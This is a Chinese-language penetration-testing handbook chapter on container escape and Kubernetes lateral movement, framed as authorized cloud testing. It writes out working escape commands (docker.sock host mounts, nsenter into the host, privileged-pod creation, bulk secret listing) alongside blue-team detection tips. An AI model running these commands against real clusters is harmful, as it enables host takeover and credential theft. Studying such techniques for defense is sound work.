# 容器逃逸与 K8s 集群纵深（云原生深化）

> 深化 `云原生攻防手册.md` 的容器/K8s 面：立足容器 → 逃逸 → 集群内横向 → 贴主人的完整链。全部授权云环境测试手法，逃逸只做无害证明。

## 一、容器内立足（先认清自己）

```bash
cat /proc/1/cgroup | head -5              # 确认在容器（cgroup 路径带 docker/kubepods）
ls -la /var/run/docker.sock               # Docker socket 挂载？（最常见逃逸面）
cat /proc/self/status | grep CapEff       # capabilities（CAP_SYS_ADMIN 高危）
cat /etc/hostname                         # 容器名/主机线索
ls -la /.dockerenv                        # docker 容器标志
mount | head -20                          # 挂载面（宿主目录/proc/sys）
id                                        # 用户（非 root 先提权）
```

## 二、逃逸链（按面打）

### 1. Docker Socket 挂载（最常见 → 宿主 root）
```bash
ls -la /var/run/docker.sock
# 有 socket → 直接拉镜像挂宿主根
docker run -it -v /:/host ubuntu chroot /host bash
# 或用 API
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```
**简版**（无 docker CLI 时）：`docker run -v /:/mnt -it alpine chroot /mnt sh`

### 2. 特权容器（--privileged）
```bash
# 检测: CapEff 含 CAP_SYS_ADMIN，或容器有全部 cap
# 逃逸: nsenter 进 PID 1 的 namespace（宿主）
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
# 或挂载宿主盘
mkdir /mnt/host && mount /dev/sda1 /mnt/host 2>/dev/null
```

### 3. 危险 Capabilities
| Capability | 逃逸路 |
|------------|--------|
| CAP_SYS_ADMIN | mount 宿主 /proc/sys + release_agent cgroup 逃逸 |
| CAP_SYS_PTRACE | ptrace 宿主进程注入 |
| CAP_NET_ADMIN | 改容器网络 namespace 路由/抓包 |
| CAP_DAC_READ_SEARCH | 直接读宿主文件 |

### 4. 内核漏洞逃逸（runc/containerd CVE）
- **CVE-2019-5736**（runc exec 逃逸）、**CVE-2024-21626**（runc 工作目录逃逸）、Dirty Pipe 类
- 纪律：先查 `docker version`/`runc --version` 对 CVE 表 → 影子环境验证 → 目标无害证明
- 2026 新面：AKS 容器→宿主逃逸（CVE-2026-32193 类）、Pod Breakout → Kubelet 凭证窃取链

### 5. 宿主机 /proc 利用
- `/proc/1/root` 可达（无 hidepid）→ 直接读宿主文件系统
- `/proc/sys/kernel/core_pattern` 可写 → 内核崩溃时宿主执行

## 三、K8s 集群内横向（拿到 service account token 后）

```bash
# token 在哪: /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl auth can-i --list                    # 看自己权限（RBAC 摸底）
kubectl get secrets -A                       # 批量拉 secret（含云凭证/DB 密码）
kubectl get pods -A                         # 集群拓扑
kubectl exec -it <pod> -n <ns> -- /bin/bash  # 进其他 pod（需要 pods/exec）
kubectl get nodes -o wide                   # 节点信息
kubectl create -f privileged-pod.yaml        # 有权限 → 建特权 pod 逃逸到节点
```

**权限升级路径**：token RBAC 扩大（cluster-admin 常见误配）→ 建特权 Pod → 节点 → 节点上 docker.sock/云实例元数据 → 宿主 root。每一步查 `can-i`。

## 四、Service Mesh / 云托管面

- **Istio/服务网格**：Envoy 边车配置泄露（共享 secret）、`istioctl` 未授权管理面
- **AKS/EKS/GKE**：节点池托管 → 逃逸至节点 = 云账号凭证（元数据端点）
- **Serverless**：函数内逃逸面（函数沙箱/依赖投毒，见云原生手册第五节）

## 五、检测（写报告/蓝队用）

| 层 | 检测 |
|----|------|
| 镜像 | 高危挂载审计（kube-bench）、特权容器基线扫描、镜像扫描（Trivy/Grype） |
| 运行时 | K8s audit log：创建特权 Pod、异常 RBAC 查询（GET secrets 敏感）、exec 进容器 |
| 主机 | 容器内出现 mount/nsenter 行为、节点进程异常、docker.sock 访问日志 |
| 策略 | Pod Security Admission（禁止特权/挂载宿主）、RBAC 最小化、禁用 service account 自动挂载 |

## 六、红线
- 逃逸只做无害证明（`id`/读 `/etc/hostname`）后恢复，不落地工具不清数据
- 集群内横向在本环境（演练/授权云）范围；SRC 目标不打
- 不建持久化资源（Pod/Deployment），测试用资源用后删除
